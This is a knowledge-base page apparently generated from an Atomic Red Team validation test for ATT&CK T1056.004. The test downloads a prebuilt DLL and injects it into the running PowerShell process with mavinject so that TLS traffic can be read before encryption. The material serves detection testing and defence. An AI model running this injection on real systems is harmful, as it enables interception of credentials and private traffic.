---
atomic_guid: "de1934ea-1fbf-425b-8795-65fb27dd7e33"
title: "Hook PowerShell TLS Encrypt/Decrypt Messages"
framework: "atomic"
generated: "true"
attack_technique_id: "T1056.004"
attack_technique_name: "Input Capture: Credential API Hooking"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.004/T1056.004.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "de1934ea-1fbf-425b-8795-65fb27dd7e33"
  - "Hook PowerShell TLS Encrypt/Decrypt Messages"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Hook PowerShell TLS Encrypt/Decrypt Messages

Hooks functions in PowerShell to read TLS Communications

## Metadata

- Atomic GUID: de1934ea-1fbf-425b-8795-65fb27dd7e33
- Technique: T1056.004: Input Capture: Credential API Hooking
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1056.004/T1056.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1056-input_capture|T1056.004]]

## Input Arguments

### file_name

- description: Dll To Inject
- type: path
- default: PathToAtomicsFolder\T1056.004\bin\T1056.004x64.dll

### server_name

- description: TLS Server To Test Get Request
- type: url
- default: https://www.example.com

## Dependencies

T1056.004x64.dll must exist on disk at specified location (#{file_name})

### Prerequisite Check

```powershell
if (Test-Path "#{file_name}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}" -UseBasicParsing
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
mavinject $pid /INJECTRUNNING "#{file_name}"
Invoke-WebRequest #{server_name} -UseBasicParsing
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.004/T1056.004.yaml)
